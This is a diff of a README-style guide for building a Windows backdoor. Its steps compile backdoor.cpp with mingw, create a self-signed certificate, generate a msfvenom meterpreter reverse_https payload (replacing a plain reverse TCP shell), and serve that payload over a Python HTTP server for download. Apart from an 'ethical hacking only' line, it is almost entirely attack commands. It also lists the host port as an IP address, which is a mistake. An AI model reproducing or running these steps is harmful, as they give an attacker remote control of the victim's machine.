@@ -11,12 +11,29 @@ Use this for ethical hacking only
 
     x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
     
-3- Create the Payload with msfvenom in Kali linux
+    
+3- Create custom SSL/TLS certificate 
 
-    msfvenom -p windows/x64/shell_reverse_tcp lhost="Host IP" lport="Host Port" -f raw > load.bin
+    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
+    -keyout www.example.com.key \
+    -out www.example.com.crt && \
+    cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
+    rm -f www.example.com.key  www.example.com.crt
     
+      
     
-4- Setup the http webserver for Payload download (while in cybersecurity folder)
+4- Create the Payload with msfvenom in Kali linux
+    in my case:
+    Host IP= 192.168.235.132
+    Host Port= 192.168.235.132
+    Path To cert file= /home/kali/cybersecurity/www.example.com.pem
+      
+    msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
+    
+   
+    
+5- Setup the http webserver for Payload download (while in cybersecurity folder)
 
     python -m http.server
     
